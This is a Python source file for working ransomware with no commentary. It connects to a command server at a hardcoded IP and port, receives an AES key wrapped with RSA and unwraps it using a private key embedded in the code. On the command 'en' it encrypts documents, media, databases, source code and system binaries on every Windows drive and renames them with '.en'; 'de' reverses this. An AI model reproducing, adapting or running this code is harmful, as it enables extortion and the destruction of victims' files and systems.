import os
import os.path
from Cryptodome import Random
from Cryptodome.Cipher import AES
from Cryptodome.Util import Counter
import socket
import time
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import PKCS1_OAEP


# the encryption method AES_CTR mode
def encryption(key,filepath):
    ctr = Counter.new(128)
    c= AES.new(key,AES.MODE_CTR,counter = ctr)
    if os.path.exists(filepath):
        with open(filepath,'rb+') as file:
            block_size = 16
            data = file.read(block_size)    
            while data:
                file.seek(-len(data),1)
                file.write(c.encrypt(data))
                data = file.read(block_size)
        os.rename(filepath,filepath+".en")
        return key

# the decryption method
def decryption(key,filepath):
    counter = Counter.new(128)
    c= AES.new(key,AES.MODE_CTR,counter = counter)
    
    with open(filepath,'rb+') as file:
        block_size = 16
        data = file.read(block_size)
        
        while data:
            file.seek(-len(data),1)
            file.write(c.decrypt(data))
            data = file.read(block_size)    
    os.rename(filepath,filepath.strip(".en"))

# listing windows partitions
def getPartitions():
    li = []
    for i in range(65,91):
        path = chr(i) + "://"
        if(os.path.exists(path)):
            li.append(path)
    return li


# listing linux directories
def linux_dirs():
    li = ["/home","/usr","/sbin","/bin"]
    return li


# listing files
def list_files(start_path):
    extensions = [
        'exe', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES [danger]
        'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
        'yml', 'yaml', 'json', 'xml', 'csv', # structured data
        'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images
        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
        'java', 'class', 'jar', # java source code
        'ps', 'bat', 'vb', # windows based scripts
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
        'go', 'py', 'pyc', 'bf', 'coffee', # other source code files
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak' # Compressed
        ,'en' # encryption format 
        ]

    files = []
    for root, dirs, fs in os.walk(start_path):
        for name in fs:
            fullpath = os.path.join(root, name)
            ex = fullpath.split(".")[-1]
            if(ex in extensions):
                files.append(fullpath)
                #print(fullpath)
    return files


def Client():
    
    prk = """-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA6rLPW9CeMMx9c0n5C9t7XMfXaIpQ88RW0hOAgDNXsT6G+40y
X02ThQGjuGolXdxUzKl510MntdQXHxusynnihhibrg3Dm1I4n6Ddzj42rOo6qmas
agzbABkt++CZcZyADbANhuQly7qOzMpfIcIrM7VayfFdgxgeoMR1JgFXA107tr9c
mguhs6J2WHlAESspknneYMuxA7AJcGwIbDH0NIqMRw1hZBTiAILCCPvLIH/d7wAi
ZFCWCsDh4PTotDj9WgdrLECGpnSvCtlB2HRGCHRitKzrpxZM+LeOsAxfKucZZWwx
R9tYX3ug8/CudRA5WAURP8lM4K09Q/hd2wCbnwIDAQABAoIBAAacVvQmePycBnZO
blSxq5S0rPqgNSVSvnlNenSdtRJkXnJdYFg3ETSicdI2H7hR25zystf48CuSU5qq
NdxRfSt/TgOKJ4Kx2OLrw1sZ7D3/ex3hAzaRGDK94LC8lPkSW0ElT8VLiYARYbsw
G2h4c3nv0QKLXGTnRITI8bMfyDRJO9GETZ3/Cz+HL8kO9P67jyf5k7XlIAzvf3qV
h8JoayNEdv63rQBp2jEKMWvEPabrzqlbI9FFvvNqnGwFeLNBZp5cGJDvV9c0G1It
8swd8PXBsyF+AypZwuHDYwC2eDbI9YNZIy7SHmpg2Jc70J2uDVhuP1hBqT1/zDws
cb7TPjUCgYEA7UVXJ8GaE2Nhtnxdr/7k9TBogpUkzJWAXVWzh5A6lRzlLgUpJPQr
CEqfbcnxPpVdh7sx8BHHOTzWdtL9bQSAn0ekb8Xjd0YJPgJrKVUH8f7iEfpy8gvb
xU0QY4+SYdwHHLBnBOGh8EvpmCltrsb6Q5PWJnq/crqk2Ey4ehUzqeUCgYEA/Tl8
7NxrfBqdmoQdDZjs+p9YohxLYA0d6h7JlAKoGr5C4eG4c7GUoDSPpTRUw4M3aymA
U47Ow62mZQNI26ZU03dFLjoH1ur5QfZEYkE0/kStoMCAsbb78+TAkMxjlF/sLD3B
zEt0Oao/bTCBh/ZY9TINP7FNrA59IF+pGEzGhzMCgYApKgCG6zW562IGcOkoIYbD
axSWox1xSPauOrIc8M7ZE9xG8apDuQDGPXwPZhuuiediJv3w8oSnz4A9uTkycreF
6r4Cjkh6ZvIviefhkdkBCQFbsSHEEH6ealJPk5cH1058kbYtyJ95uxHZzkYzLl44
3ysmHeGdG/iBdj4DIC6IaQKBgQDFX2u6C0xUHUK+zz79/DaqWk1xffBaW573fyvL
jA6PWcEz4wYsVzvra0yTjiiLg9lMU7rMZkFPUCikD11Yp1rywMJRd7XolJnYCiXf
F8hAcDONWr50xpW30pMtycHMQsAI89H8dMuQrtxlNSuhWCiaZXriLEbIVzq8YxOf
9ye+9QKBgG82p76QbYcxJCRP2qQiLRbCAjxvpvHCNokUYX03G27qJ6lfJM/0NNt5
GBeUs9f7imfKU07cpjyx5RaFuBkALRgN3TXeh/AxM+wDKkdG0PmL/GZ+d9K15LTV
ZhNaADO7LfpTTA3IoY2nG8PEskjYB8yANKnC5231CBeHHKYHDdcs
-----END RSA PRIVATE KEY-----"""

    prk = prk.encode('ascii')
    privatekey = RSA.importKey(prk)
    decryptor = PKCS1_OAEP.new(privatekey)
     
    port = 4545
    ip = "192.168.1.10"
    
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip,port))
        encrypted_key = s.recv(2048)
        decrypted_key = decryptor.decrypt(encrypted_key)
        key = decrypted_key.decode('ascii')
        
        padding = lambda s : s + (16-len(s)%16) * '*'
        key = padding(key).encode('ascii')
        print(key)
        
        s.send(b"the key saved")
        while True:
            command = s.recv(2048)
            command = command.decode('ascii')
            
            if command == "en":
                partitions = getPartitions()
                for partition in partitions:
                    files = list_files(partition)
                    for file in files:
                        encryption(key,file)
                s.send(b"\nfinished encryption\n")
                
            if command == "de":
                partitions = getPartitions()
                for partition in partitions:
                    files = list_files(partition)
                    for file in files:
                        decryption(key,file)
                s.send(b"\nfinished decryption\n")
                
    except socket.error as e:
        print("trying to connect with server with in 60 seconds")
        time.sleep(60)
        s.close()
        Client()

Client()



